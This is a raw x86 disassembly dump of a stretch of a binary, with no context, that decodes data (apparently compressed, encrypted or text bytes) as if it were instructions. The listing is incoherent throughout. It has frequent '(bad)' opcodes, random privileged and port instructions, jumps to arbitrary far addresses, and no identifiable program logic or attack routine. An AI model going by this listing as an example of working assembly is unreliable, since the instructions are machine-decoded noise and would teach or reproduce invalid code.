  41027c:	jbe    0x41029e
  41027e:	gs daa 
  410280:	mov    ebp,0x50ae2f67
  410285:	push   eax
  410286:	push   eax
  410287:	stos   BYTE PTR es:[edi],al
  410288:	push   esp
  410289:	push   eax
  41028a:	push   eax
  41028b:	push   cs
  41028c:	out    dx,al
  41028d:	push   eax
  41028e:	push   eax
  41028f:	push   eax
  410290:	mov    ecx,DWORD PTR [ebx-0x74747475]
  410296:	mov    ecx,DWORD PTR [ebx+0x6da3f8b]
  41029c:	aad    0xd1
  41029e:	(bad)
  4102a1:	repz add ah,BYTE PTR [esi+0x30]
  4102a5:	mov    dl,0xff
  4102a7:	ds sbb al,0xfa
  4102aa:	ror    DWORD PTR [esi],1
  4102ac:	mov    ebx,0x887ab1a9
	...
  4102b9:	add    BYTE PTR [eax],al
  4102bb:	add    BYTE PTR [ebp+0x29],al
  4102be:	ja     0x4102ba
  4102c0:	add    BYTE PTR [eax],al
  4102c2:	jbe    0x41025b
  4102c4:	adc    BYTE PTR [ebp-0x4d7cccbb],ah
  4102ca:	push   ss
  4102cb:	and    eax,0x1c6a1b7d
  4102d0:	int3   
  4102d1:	sbb    eax,ebp
  4102d3:	push   ebp
  4102d4:	xchg   ecx,eax
  4102d5:	fwait
  4102d6:	shl    ch,1
  4102d8:	pop    edi
  4102d9:	jae    0x410355
  4102db:	pop    ebp
  4102dc:	cmp    al,0x3e
  4102de:	in     al,0x49
  4102e0:	cmp    BYTE PTR ds:0x7bacd,0x0
  4102e7:	jmp    0xd58:0x2a0000a8
  4102ee:	add    BYTE PTR [ebx-0x1dcba6b6],cl
  4102f4:	xchg   esi,eax
  4102f5:	ins    DWORD PTR es:[edi],dx
  4102f6:	xchg   esi,eax
  4102f7:	adc    edi,ebx
  4102f9:	ret    0xbe0
  4102fc:	enter  0xaf5a,0xe6
  410300:	fadd   QWORD PTR [ebp-0x4b]
  410303:	les    eax,FWORD PTR ds:0x8b51cd88
  410309:	mov    ecx,DWORD PTR [ebx-0x49f46419]
  41030f:	pop    ecx
  410310:	push   edi
  410311:	arpl   dx,di
  410313:	pushf  
  410314:	pop    ss
  410315:	(bad)  
  410316:	aas    
  410317:	fdivr  QWORD PTR [ecx+0x4fce5e01]
  41031d:	aas    
  41031e:	inc    DWORD PTR [edx]
  410320:	pop    eax
  410321:	(bad)  
  410322:	dec    edx
  410323:	mov    BYTE PTR [ebp+0x1b],0xa3
  410327:	xor    ecx,DWORD PTR [ebx+0x578f578b]
  41032d:	mov    ecx,DWORD PTR [ebx-0x75]
  410333:	(bad)  
  410334:	(bad)  
  410335:	(bad)  
  410336:	(bad)  
  410337:	(bad)  
  410338:	dec    DWORD PTR [ebp+0x6e34]
	...
  410346:	add    BYTE PTR [esi],bl
  410348:	pusha  
  410349:	loop   0x41037e
  41034b:	jo     0x4103b0
  41034d:	xor    al,0xda
  41034f:	dec    esi
  410350:	cmp    eax,0x1e27c9ff
  410355:	pop    edi
  410356:	jl     0x410336
  410358:	in     al,0x4f
  41035a:	or     BYTE PTR [esi],0xe
  41035d:	sub    eax,0x33000089
  410362:	push   ebx
  410363:	add    BYTE PTR [eax],al
  410365:	ins    BYTE PTR es:[edi],dx
  410366:	pop    esi
  410367:	add    BYTE PTR [eax],al
  410369:	adc    dl,al
  41036b:	dec    ebx
  41036c:	or     eax,0xdcd1d8b8
  410371:	(bad)  
  410372:	repnz xor al,0x5b
  410375:	(bad)  
  410376:	mov    al,0xe4
  410378:	(bad)  [eax-0x5d]
  41037b:	xor    ah,BYTE PTR [ebx+ecx*8+0x44]
  41037f:	popa   
  410380:	jno    0x410382
  410382:	jne    0x4103b4
  410384:	jle    0x4103e5
  410386:	cmp    DWORD PTR [ebp+0x75],esi
  410389:	jne    0x410344
  41038b:	dec    eax
  41038c:	jns    0x410344
  41038e:	jecxz  0x410328
  410390:	stc    
  410391:	push   0xa7af35e0
  410396:	int    0xa1
  410398:	sbb    DWORD PTR [ebx],edx
  41039a:	repnz mov ?,WORD PTR [edi]
  41039d:	out    0x9c,al
  41039f:	je     0x410347
  4103a1:	arpl   WORD PTR [esi-0x1144c199],si
  4103a7:	pop    esp
  4103a8:	cmp    al,0x56
  4103aa:	and    dh,bl
  4103ac:	mov    ecx,0xdb637575
  4103b1:	jne    0x410428
  4103b3:	jne    0x410375
  4103b5:	rol    al,0xc0
  4103b8:	rol    al,0xc0
  4103bb:	rol    al,0x14
  4103be:	fsub   QWORD PTR [ecx+0x33]
  4103c1:	xor    esi,DWORD PTR [ebx]
  4103c3:	xor    esi,DWORD PTR [ebx]
  4103c5:	xor    esi,DWORD PTR [ebx]
  4103c7:	xor    esi,DWORD PTR [ebx]
  4103c9:	(bad)  
  4103ca:	call   DWORD PTR [edi+0x5aa50cfc]
  4103d0:	pop    ebx
  4103d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4103d2:	add    BYTE PTR [edi+0x13c12116],bl
  4103d8:	or     al,al
  4103da:	inc    esi
  4103db:	test   DWORD PTR [esp+ebx*1],0x17387d7c
  4103e2:	dec    ebp
  4103e3:	(bad)  
  4103e4:	dec    edx
  4103e6:	vmptrst QWORD PTR ds:0xe4c84ac5
  4103ed:	add    DWORD PTR [ebp+0x39],edi
  4103f0:	jmp    0xacaea22a
  4103f5:	sbb    DWORD PTR ds:[ebx+0x6f913bf0],edx
  4103fc:	xor    eax,0x8e6d79e1
  410401:	das    
  410402:	(bad)  
  410403:	inc    ecx
  410405:	push   eax
  410406:	retf   
  410407:	(bad)  
  410408:	call   DWORD PTR [esi-0xc]
  41040b:	fdiv   st(7),st
  41040d:	call   DWORD PTR [ecx+0x40]
  410410:	jbe    0x4103a8
  410412:	jne    0x410416
  410414:	jmp    0x4103a0
  410416:	adc    dh,BYTE PTR [edx+ebp*1+0x47d5db97]
  41041d:	mov    ds:0x26c8150d,eax
  410422:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410423:	iret   
  410424:	pop    edi
  410425:	int    0xff
  410427:	(bad)  
  410428:	call   esi
  41042a:	dec    esp
  41042b:	(bad)  
  41042c:	call   FWORD PTR ds:0xffffff35
	...
  41043a:	outs   dx,DWORD PTR ds:[esi]
  41043c:	imul   edx,DWORD PTR [edi+0x65],0x61
  410440:	jae    0x410464
  410442:	ins    DWORD PTR es:[edi],dx
  410443:	jo     0x4104a8
  410445:	and    BYTE PTR [edx],bh
  410447:	gs ins DWORD PTR es:[edi],dx
  410449:	cs inc esp
  41044b:	jo     0x4104a0
  41044d:	arpl   WORD PTR [ebx+0x6d],sp
  410450:	popa   
  410451:	and    BYTE PTR [esi+ebp*2+0x65],al
  410455:	cmp    eax,0x6f786d6d
  41045a:	das    
  41045b:	and    BYTE PTR [ecx+0x66],ch
  41045e:	ds push ebx
  410460:	outs   dx,BYTE PTR ds:[esi]
  410461:	outs   dx,DWORD PTR ds:[esi]
  410462:	gs inc edi
  410464:	or     eax,0x72767374
  410469:	dec    ebp
  41046a:	and    BYTE PTR [ebx+0x20],dh
  41046d:	inc    esp
  41046e:	outs   dx,BYTE PTR ds:[esi]
  41046f:	and    BYTE PTR [ebx+0x75],dh
  410472:	je     0x4104d7
  410474:	ins    DWORD PTR es:[edi],dx
  410475:	ins    DWORD PTR es:[edi],dx
  410476:	cs cmp eax,0x206d0d2f
  41047c:	imul   ecx,DWORD PTR [ebp+0x69],0x2f286562
  410483:	outs   dx,DWORD PTR ds:[esi]
  410484:	jb     0x4104fa
  410486:	ins    DWORD PTR es:[di],dx
  410488:	imul   edi,DWORD PTR [bp+si],0x693c4465
  41048f:	cmp    ch,BYTE PTR [edi+ebp*2+0x65]
  410493:	ins    BYTE PTR es:[edi],dx
  410494:	inc    esi
  410495:	outs   dx,DWORD PTR ds:[esi]
  410496:	popa   
  410497:	push   0x67203c29
  41049c:	outs   dx,DWORD PTR ds:[esi]
  41049d:	fs inc ecx
  41049f:	ds push ebx
  4104a1:	bound  esi,QWORD PTR [ecx+ebp*2+0x20]
  4104a5:	add    al,dh
  4104a7:	outs   dx,BYTE PTR ds:[esi]
  4104a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104a9:	cwde   
  4104aa:	test   DWORD PTR [ecx+0x57],ebp
  4104ad:	sti    
  4104ae:	or     al,BYTE PTR [ebx]
  4104b0:	pusha  
  4104b1:	xor    eax,DWORD PTR [esi-0x2d]
  4104b4:	fldz   
  4104b6:	push   ebx
  4104b7:	push   esi
  4104b8:	jne    0x4104f3
  4104ba:	xlat   BYTE PTR ds:[ebx]
  4104bb:	mov    edx,0x92ca
  4104c0:	add    BYTE PTR [eax],al
  4104c2:	add    BYTE PTR [eax],al
  4104c4:	add    BYTE PTR [eax],al
  4104c6:	add    ah,cl
  4104c8:	int3   
  4104c9:	adc    al,BYTE PTR [edx]
  4104cb:	repz xor esp,ecx
  4104ce:	int3   
  4104cf:	dec    ecx
  4104d0:	and    DWORD PTR [ecx+0x12f7e7bb],0x9c579d5e
  4104da:	sbb    BYTE PTR [esi],ah
  4104dc:	stos   DWORD PTR es:[edi],eax
  4104dd:	jno    0x41054e
  4104df:	add    eax,0x7518a09d
  4104e4:	xor    eax,0x1d511515
  4104e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104ea:	ror    DWORD PTR [eax-0x4a0d7f14],1
  4104f0:	or     DWORD PTR [esi-0x34],ebx
  4104f3:	int3   
  4104f4:	sahf   
  4104f5:	xchg   ah,cl
  4104f7:	int3   
  4104f8:	je     0x4104e0
  4104fa:	data16 int3 
  4104fc:	add    BYTE PTR [ecx-0x4ffcbd8a],dl
  410502:	pop    ebx
  410503:	outs   dx,DWORD PTR ds:[esi]
  410504:	imul   ebp,edx,0xffffffcf
  410507:	stos   BYTE PTR es:[edi],al
  410508:	cmp    bl,al
  41050a:	pop    ebp
  41050b:	leave  
  41050c:	inc    ebp
  41050d:	test   BYTE PTR [ebx+eax*4+0x1b],dl
  410511:	icebp  
  410512:	(bad)  
  410513:	(bad)  
  410514:	push   esp
  410515:	add    BYTE PTR [eax],al
  410517:	add    BYTE PTR [edi],al
  410519:	jb     0x4104e1
  41051b:	jmp    0x25f9e3a8
  410520:	sbb    BYTE PTR ss:[edi-0x57178aad],bh
  410527:	gs pop ecx
  410529:	dec    eax
  41052a:	in     eax,dx
  41052b:	in     eax,0x52
  41052d:	push   cs
  41052e:	ja     0x4104b9
  410530:	xor    BYTE PTR [ebx],0x48
  410533:	test   al,0x27
  410535:	add    BYTE PTR [eax],al
  410537:	mov    ebx,0xd154
  41053c:	add    bh,bh
  41053e:	(bad)  
  41053f:	(bad)  
  410540:	(bad)  
  410541:	(bad)  
  410542:	(bad)  
  410543:	(bad)  
  410544:	(bad)  
  410545:	push   DWORD PTR [edx+0x5696]
  41054b:	add    BYTE PTR [eax],al
  41054d:	add    BYTE PTR [eax],al
  41054f:	add    BYTE PTR [eax],al
  410551:	add    bh,bh
  410553:	call   FWORD PTR [edi+0x14a42365]
  410559:	push   0xffffff87
  41055b:	inc    esi
  41055c:	mov    cl,0x46
  41055e:	sar    BYTE PTR [edx],1
  410560:	jg     0x410569
  410562:	dec    ecx
  410563:	rcr    BYTE PTR [esi+0x287ff014],1
  410569:	lods   al,BYTE PTR ds:[esi]
  41056a:	pop    esi
  41056b:	pop    ecx
  41056c:	(bad)  
  41056d:	jmp    DWORD PTR [ebp-0x6b0000a4]
  410573:	outs   dx,BYTE PTR ds:[esi]
  410574:	(bad)  
  410575:	dec    DWORD PTR [ebp+0x4]
  410578:	xchg   esp,eax
  410579:	dec    edx
  41057a:	sbb    al,0xd2
  41057c:	and    al,cl
  41057e:	out    0x6f,al
  410580:	xchg   edi,eax
  410581:	sub    al,0x6e
  410583:	or     eax,0x1d61735d
  410588:	lods   eax,DWORD PTR ds:[esi]
  410589:	jne    0x4105e5
  41058b:	pusha  
  41058c:	xlat   BYTE PTR ds:[ebx]
  41058d:	ja     0x41058e
  41058f:	inc    ebp
  410590:	ret    0x8dc
  410593:	push   ds
  410594:	inc    ebp
  410595:	inc    ebp
  410596:	inc    ebp
  410597:	in     al,0x69
  410599:	dec    eax
  41059a:	inc    eax
  41059b:	xor    al,BYTE PTR [edi-0x11ea30a0]
  4105a1:	xchg   ecx,eax
  4105a2:	cmp    al,0x71
  4105a4:	out    dx,al
  4105a5:	jmp    0x410594
  4105a7:	xchg   edi,eax
  4105a8:	and    ebp,ecx
  4105aa:	bound  ecx,QWORD PTR [eax-0x34]
  4105ad:	xchg   edi,eax
  4105ae:	mov    ch,BYTE PTR [ebx-0x4bbc6416]
  4105b4:	or     al,0xbe
  4105b6:	pop    esp
  4105b7:	jle    0x41057d
  4105b9:	addr16 inc ebp
  4105bb:	inc    ebp
  4105bc:	jge    0x4105dd
  4105be:	inc    ebp
  4105bf:	inc    ebp
  4105c0:	inc    ebp
  4105c1:	lea    ecx,[ebp-0x72727273]
  4105c7:	lea    ecx,[ebp+0x1d51018d]
  4105cd:	(bad)  
  4105ce:	(bad)  
  4105cf:	(bad)  
  4105d0:	(bad)  
  4105d1:	(bad)  
  4105d2:	(bad)  
  4105d3:	(bad)  
  4105d4:	(bad)  
  4105d5:	inc    DWORD PTR [eax]
  4105d7:	add    BYTE PTR [ecx-0x25],al
  4105da:	retf   
  4105db:	adc    eax,0x16aafcb4
  4105e0:	ret    
  4105e1:	jno    0x410578
  4105e3:	outs   dx,BYTE PTR ds:[esi]
  4105e4:	and    eax,0xf986cf22
  4105e9:	sbb    DWORD PTR [eax],esp
  4105eb:	jns    0x410584
  4105ed:	lea    ecx,[ebx+eiz*2+0x76720000]
  4105f4:	(bad)  
  4105f5:	xchg   esp,eax
  4105f6:	fild   WORD PTR [ebx]
  4105f8:	aad    0xcb
  4105fa:	sub    BYTE PTR [ebx],0xf6
  4105fd:	mov    ecx,0x19e4355c
  410602:	loope  0x410633
  410604:	push   edi
  410605:	lds    ebp,FWORD PTR [edx]
  410607:	aad    0x4b
  410609:	jnp    0x410654
  41060b:	push   esi
  41060c:	pop    esi
  41060d:	push   es
  41060e:	add    al,0x0
  410610:	add    al,ah
  410612:	call   0x36f0:0xbe0000b5
  410619:	add    BYTE PTR [eax],al
  41061b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41061c:	jo     0x41063d
  41061e:	mov    ebx,DWORD PTR [ebp+0x3d]
  410621:	popa   
  410622:	scas   eax,DWORD PTR es:[edi]
  410623:	pop    ecx
  410624:	popa   
  410625:	mov    esp,0xd984f531
  41062a:	std    
  41062b:	popf   
  41062c:	or     eax,0x53ff52d7
  410631:	in     al,0xaa
  410633:	add    BYTE PTR [eax],al
  410635:	add    BYTE PTR [ecx+0x17],ah
  410638:	add    BYTE PTR [eax],al
  41063a:	sbb    eax,0x31
	...
  410647:	add    dh,bh
  410649:	retf   0xaf7
  41064c:	dec    edx
  41064d:	jmp    0x2f4e9d3e
  410652:	adc    eax,0x2dbf6776
  410657:	aas    
  410658:	or     al,0xbd
  41065a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41065b:	js     0x41069a
  41065d:	repz lds eax,FWORD PTR ds:[eax]
	...
  410669:	add    DWORD PTR [ebx-0x10bbcdc4],0xffffff83
  410670:	sub    DWORD PTR [eax-0xd],0x5f
  410674:	or     edx,DWORD PTR [ebx+edx*8+0x0]
  410678:	jp     0x410688
  41067a:	pop    ss
  41067b:	nop
  41067c:	pop    edx
  41067d:	mov    dl,0x1a
  41067f:	pop    esp
  410680:	(bad)  
  410681:	(bad)  
  410682:	test   al,0x75
  410684:	mov    edi,eax
  410686:	lea    ecx,[ebp+eiz*8+0x7]
  41068a:	idiv   edx
  41068c:	mov    esi,0xeca003d3
  410691:	mov    edi,0x8383d27b
  410696:	(bad)  
  410697:	add    DWORD PTR ds:[ebx-0x7c3fd605],0x33
  41069f:	pcmpeqd mm7,QWORD PTR [eax-0x13]
  4106a3:	mov    esi,edx
  4106a5:	(bad)  
  4106a6:	push   0x6bb474d5
  4106ab:	arpl   di,dx
  4106ad:	into   
  4106ae:	inc    esi
  4106af:	call   0xa048:0x1c9797cc
  4106b6:	inc    ecx
  4106b7:	xor    esi,DWORD PTR [ebx]
  4106b9:	xor    ecx,ebp
  4106bb:	or     DWORD PTR [ebp+0x7a],eax
  4106be:	add    dl,dh
  4106c0:	mov    esi,0xf9e2c4f9
  4106c5:	lea    eax,[edi]
  4106c7:	aaa    
  4106c8:	adc    eax,0x57b9d24f
  4106cd:	sbb    bh,BYTE PTR [ebp-0x61a602dc]
  4106d3:	push   ebp
  4106d4:	cmc    
  4106d5:	sub    eax,0xae3333ee
  4106da:	call   edi
  4106dc:	xor    esi,DWORD PTR [ebx]
  4106de:	xor    edi,edi
  4106e0:	(bad)  
  4106e1:	(bad)  
  4106e2:	(bad)  
  4106e3:	(bad)  
  4106e4:	(bad)  
  4106e5:	(bad)  
  4106e6:	(bad)  
  4106e7:	call   DWORD PTR [esi]
  4106e9:	shl    BYTE PTR [edx],cl
	...
  4106f3:	add    BYTE PTR [ebp+0x4f0fc685],al
  4106f9:	mov    eax,ds:0x2e7b7643
  4106fe:	hlt    
  4106ff:	dec    ecx
  410700:	cs ins DWORD PTR es:[edi],dx
  410702:	retf   
  410703:	add    BYTE PTR [ebx],dl
  410705:	clc    
  410706:	jmp    0x4e6aa7b5
  41070b:	ins    DWORD PTR es:[edi],dx
  41070c:	inc    esi
  41070d:	popf   
  41070e:	test   DWORD PTR [ebp-0x7a7a3842],eax
  410714:	test   al,0xde
  410716:	test   DWORD PTR [ebp-0xbfbc49c],eax
  41071c:	push   ss
  41071d:	sub    eax,0xfd51fc23
  410722:	jae    0x4106fa
  410724:	cwde   
  410725:	lahf   
  410726:	sbb    al,0x3
  410728:	add    BYTE PTR [ebx],bl
  41072a:	aas    
  41072b:	mov    esp,gs
  41072d:	jbe    0x4106af
  41072f:	add    eax,0xccc30085
  410734:	adc    al,BYTE PTR [edi+0x0]
  410737:	add    BYTE PTR [eax],al
  410739:	inc    edi
  41073a:	(bad)  
  41073b:	stc    
  41073c:	dec    edx
  41073d:	mov    eax,ds:0x246b91b3
  410742:	and    eax,0x537a496c
  410747:	xchg   ebx,eax
  410748:	xchg   DWORD PTR [esi-0x5d3801f4],eax
  41074e:	hlt    
  41074f:	popa   
  410750:	push   ebp
  410751:	add    dl,al
  410753:	mov    WORD PTR [eax+0x1d067c07],es
  410759:	xor    BYTE PTR [edx+edi*2+0x6c1d0000],0x0
  410761:	add    BYTE PTR [eax],al
  410763:	(bad)  
  410764:	(bad)  
  410765:	(bad)  
  410766:	(bad)  
  410767:	(bad)  
  410768:	(bad)  
  410769:	(bad)  
  41076a:	(bad)  
  41076b:	push   DWORD PTR [esp+eax*1]
  41076e:	test   DWORD PTR [ebx-0x7c7c7c7d],0x83838383
  410778:	add    BYTE PTR [eax],al
  41077a:	outs   dx,DWORD PTR ds:[esi]
  41077b:	pop    ecx
  41077c:	push   ebp
  41077d:	xchg   esi,eax
  41077e:	je     0x410737
  410780:	xor    eax,0x845450f9
  410785:	(bad)  
  410786:	(bad)  
  410787:	call   0xa0fbf7ce
  41078c:	out    dx,eax
  41078d:	sbb    BYTE PTR [edx],0xcc
  410790:	out    0x4a,eax
  410792:	add    BYTE PTR [eax],al
  410794:	mov    ds:0x575227d7,eax
  410799:	jp     0x410785
  41079b:	in     al,dx
  41079c:	pop    esp
  41079d:	fsub   QWORD PTR [edi-0x52]
  4107a0:	dec    esi
  4107a1:	enter  0x872c,0x74
  4107a5:	pop    edx
  4107a6:	add    eax,0x6ab4dcf
  4107ab:	dec    edx
  4107ac:	xchg   DWORD PTR [edi+0x12b262],ecx
  4107b2:	add    BYTE PTR [ebp+edi*1+0xc0000d1],ah
  4107b9:	in     al,dx
  4107ba:	sahf   
  4107bb:	add    BYTE PTR [ebx+0x50986e5f],cl
  4107c1:	mov    ebp,0x49ac0897
  4107c6:	(bad)  
  4107c8:	outs   dx,BYTE PTR cs:[esi]
  4107ca:	jae    0x41083b
  4107cc:	outs   dx,DWORD PTR ds:[esi]
  4107cd:	and    BYTE PTR cs:[ebx+0x61],dh
  4107d1:	arpl   WORD PTR gs:[esi+0x78],bp
  4107d5:	cs ins DWORD PTR es:[edi],dx
  4107d7:	outs   dx,BYTE PTR ds:[esi]
  4107d8:	arpl   WORD PTR [edx+0x2e],ax
  4107db:	and    BYTE PTR [ebp+0x62],ah
  4107de:	outs   dx,BYTE PTR ds:[esi]
  4107df:	ins    DWORD PTR es:[edi],dx
  4107e0:	je     0x410847
  4107e2:	ja     0x410851
  4107e4:	and    BYTE PTR [eax],ah
  4107e6:	gs cs ins DWORD PTR es:[edi],dx
  4107e9:	and    BYTE PTR [eax],ah
  4107eb:	outs   dx,DWORD PTR ds:[esi]
  4107ec:	inc    ecx
  4107ed:	imul   esp,DWORD PTR [ecx+0x72],0x6d653e6f
  4107f4:	sub    al,0x41
  4107f6:	inc    esp
  4107f7:	push   eax
  4107f8:	arpl   WORD PTR [esi+0x6d],si
  4107fb:	imul   ebp,DWORD PTR gs:[esi],0x74627253
  410802:	gs inc ecx
  410804:	arpl   WORD PTR [edi+0x22],sp
  410807:	je     0x41086e
  410809:	gs or  eax,0x65524372
  41080f:	jbe    0x410884
  410811:	bound  ebp,QWORD PTR [ecx+0x57]
  410814:	jo     0x410879
  410816:	imul   ebp,DWORD PTR ds:[esi],0x6e
  41081a:	gs gs ja 0x41088b
  41081e:	and    BYTE PTR [edx+0x61],dh
  410821:	outs   dx,BYTE PTR gs:[esi]
  410823:	and    ebp,DWORD PTR [esi]
  410825:	or     eax,0x64652074
  41082a:	cmp    al,0x65
  41082c:	and    dh,BYTE PTR [ebx]
  41082e:	jo     0x41080c
  410830:	or     eax,DWORD PTR ds:0xff5356ef
  410836:	xor    al,0x36
  410838:	dec    ecx
  410839:	sbb    ecx,DWORD PTR [ebx-0x5f517475]
  41083f:	mov    ecx,DWORD PTR [ebx-0x74749fc9]
  410845:	mov    ecx,DWORD PTR [ebx-0x74747475]
  41084b:	mov    ecx,DWORD PTR [ebx+0x3e0e8b8b]
  410851:	xchg   ecx,eax
  410852:	push   ebp
  410853:	adc    ebp,DWORD PTR [edx-0x6d]
  410856:	dec    edx
  410857:	data16 add ch,BYTE PTR [ebx]
  41085a:	jns    0x410887
  41085c:	jno    0x410892
  41085e:	xlat   BYTE PTR ds:[ebx]
  41085f:	aas    
  410860:	xchg   BYTE PTR [edx],dh
  410862:	dec    ebp
  410863:	loope  0x4108d9
  410865:	pop    eax
  410866:	ret    0x0
	...
  410871:	add    ah,dl
  410873:	sti    
  410874:	jns    0x41083c
  410876:	add    BYTE PTR [eax],al
  410878:	retf   0x9cce
  41087b:	leave  
  41087c:	into   
  41087d:	div    DWORD PTR [ebx-0x25]
  410880:	or     eax,0x8dc73fb7
  410885:	arpl   WORD PTR [edi],si
  410887:	xchg   ebx,eax
  410888:	hlt    
  410889:	clc    
  41088a:	int3   
  41088b:	sar    BYTE PTR [ebx-0x2f8bd16e],cl
  410891:	in     al,0xb5
  410893:	or     BYTE PTR [edx],0x5a
  410896:	jae    0x410864
  410898:	push   0xfb7e
  41089d:	cmp    bh,BYTE PTR [edi-0x15010000]
  4108a3:	and    BYTE PTR [eax],al
  4108a5:	jne    0x410925
  4108a7:	or     eax,0x8c0174df
  4108ac:	pop    ebx
  4108ad:	mov    al,ds:0xefe375fe
  4108b2:	aaa    
  4108b3:	push   edi
  4108b4:	pop    esi
  4108b5:	xor    BYTE PTR [ebx+0x7cd9747],cl
  4108bb:	inc    edi
  4108bc:	sar    ebp,0x75
  4108bf:	jne    0x410936
  4108c1:	push   ebp
  4108c2:	mov    ah,0xf2
  4108c4:	lahf   
  4108c5:	scas   al,BYTE PTR es:[edi]
  4108c6:	arpl   WORD PTR [edx-0x4f8734d1],ax
  4108cc:	gs inc eax
  4108ce:	int3   
  4108cf:	xlat   BYTE PTR ds:[ebx]
  4108d0:	lods   eax,DWORD PTR ds:[esi]
  4108d1:	(bad)  
  4108d2:	xlat   BYTE PTR ds:[ebx]
  4108d3:	sub    dh,bl
  4108d5:	push   edx
  4108d6:	mov    bl,0x62
  4108d8:	fidiv  WORD PTR [edx+0x35]
  4108db:	sub    BYTE PTR ds:0xcc757569,ah
  4108e1:	(bad)  
  4108e2:	pushf  
  4108e3:	jne    0x41095a
  4108e5:	jne    0x4108e7
	...
  4108ef:	aaa    
  4108f0:	daa    
  4108f1:	lahf   
  4108f2:	or     al,0xc
  4108f4:	or     al,0xc
  4108f6:	or     al,0xc
  4108f8:	or     al,0xc
  4108fa:	or     al,0xff
  4108fc:	dec    esp
  4108fe:	jle    0x41094e
  410900:	and    al,0xf1
  410902:	ins    BYTE PTR es:[edi],dx
  410903:	mov    dl,al
  410905:	jae    0x410946
  410907:	ror    DWORD PTR [ebx],cl
  410909:	jne    0x41089e
  41090b:	xor    eax,0xe00dddd3
  410910:	pop    esi
  410911:	jo     0x410970
  410913:	xchg   ecx,eax
  410914:	sub    edi,edi
  410916:	inc    DWORD PTR [esi-0xf0000f9]
  41091c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41091d:	(bad)  
  41091e:	call   DWORD PTR [edi-0x75d531d8]
  410924:	lahf   
  410925:	das    
  410926:	xchg   cl,cl
  410928:	imul   edx,DWORD PTR [eax-0x55],0xffffffc0
  41092c:	std    
  41092d:	ja     0x4108c4
  41092f:	hlt    
  410930:	ret    0xe37c
  410933:	mov    ecx,0xff7a90ea
  410938:	add    bh,ah
  41093a:	xchg   ecx,eax
  41093b:	adc    DWORD PTR [edi],edx
  41093d:	add    BYTE PTR [eax],al
  41093f:	add    BYTE PTR [esi-0x6a],bl
  410942:	dec    ebp
  410943:	adc    DWORD PTR [edi+ecx*2-0x414e17c4],ebp
  41094a:	adc    BYTE PTR [eax],ch
  41094c:	add    ebx,ebp
  41094e:	mov    eax,ds:0x4f0ca094
  410953:	sbb    al,0x44
  410955:	test   BYTE PTR [esi+0x144f3209],ah
  41095b:	pop    esi
  41095c:	outs   dx,BYTE PTR ds:[esi]
  41095d:	mov    edi,0xd827a881
  410962:	sub    DWORD PTR [eax],eax
  410964:	add    BYTE PTR [edx],bl
  410966:	jb     0x410968
  410968:	add    BYTE PTR [eax],al
  41096a:	jne    0x4109e1
  41096c:	jne    0x4109e3
  41096e:	jne    0x4109e5
  410970:	jne    0x4109e7
  410972:	jne    0x4109f3
  410974:	pop    es
  410975:	push   cs
  410976:	(bad)  
  410977:	(bad)  
  410978:	(bad)  
  410979:	(bad)  
  41097a:	(bad)  
  41097b:	(bad)  
  41097c:	(bad)  
  41097d:	(bad)  
  41097e:	dec    DWORD PTR [ebp-0x3884b73]
  410984:	add    eax,0x99408eb
  410989:	dec    esi
  41098a:	push   0xfffffff7
  41098c:	(bad)  
  41098d:	ror    DWORD PTR [edi],cl
  41098f:	fisub  WORD PTR [edx-0x150a2ea1]
  410995:	cmp    eax,ebx
  410997:	add    DWORD PTR [ecx*4-0x97c0873],edx
  41099e:	ins    DWORD PTR es:[edi],dx
  41099f:	jmp    0xedc5f969
  4109a4:	aad    0x30
  4109a6:	retf   
  4109a7:	enter  0x9d46,0x6
  4109ab:	fcomp  QWORD PTR [edi-0x80049c1]
  4109b1:	rol    DWORD PTR [esi+0x45],0x6b
  4109b5:	les    edi,FWORD PTR [ebp+0x1c8d8d16]
  4109bb:	mov    edx,0xfa8d8d19
  4109c0:	push   ds
  4109c1:	or     eax,0x776f008d
  4109c6:	xchg   DWORD PTR [ebx-0x481f7449],edx
  4109cc:	xchg   ebx,eax
  4109cd:	mov    ds:0xb17ad1b4,al
  4109d2:	popa   
  4109d3:	inc    edi
  4109d4:	jnp    0x4109b4
  4109d6:	out    0x7a,eax
  4109d8:	cmp    DWORD PTR [eax],edi
  4109da:	push   edi
  4109db:	xchg   BYTE PTR [eax],al
  4109dd:	add    BYTE PTR [eax],al
  4109df:	jmp    0x4109b3
  4109e1:	add    BYTE PTR [eax],al
  4109e3:	aad    0xf
  4109e5:	add    BYTE PTR [eax],al
  4109e7:	add    bh,bh
  4109e9:	(bad)  
  4109ea:	(bad)  
  4109eb:	(bad)  
  4109ec:	(bad)  
  4109ed:	(bad)  
  4109ee:	(bad)  
  4109ef:	(bad)  
  4109f0:	jmp    FWORD PTR [esp+ebx*1]
  4109f3:	push   ecx
  4109f4:	enter  0xc88,0x3c
  4109f8:	fcom   DWORD PTR [eax-0x25940565]
  4109fe:	data16 aam 0xeb
  410a01:	mov    esp,0x3283aee
  410a06:	clc    
  410a07:	push   ds
  410a08:	or     BYTE PTR [eax],al
	...
  410a12:	add    BYTE PTR [eax],al
  410a14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a15:	daa    
  410a16:	cmp    al,0xb5
  410a18:	add    BYTE PTR [eax],al
  410a1a:	pop    ebx
  410a1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a1c:	xor    eax,DWORD PTR [esi+0x5d]
  410a1f:	inc    ebx
  410a20:	adc    ch,BYTE PTR [edi-0x21]
  410a23:	pop    esi
  410a24:	cdq    
  410a25:	dec    ebx
  410a26:	and    ebp,DWORD PTR [esi+ecx*1]
  410a29:	cmc    
  410a2a:	xchg   ebx,eax
  410a2b:	dec    edx
  410a2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a2d:	xchg   edx,eax
  410a2e:	push   0x5aede91a
  410a33:	aas    
  410a34:	mov    ah,0x93
  410a36:	sbb    eax,DWORD PTR [edx-0x382ae1e2]
  410a3c:	stc    
  410a3d:	add    BYTE PTR [eax],al
  410a3f:	mov    eax,ds:0xb8000061
  410a44:	stos   DWORD PTR es:[edi],eax
  410a45:	in     eax,dx
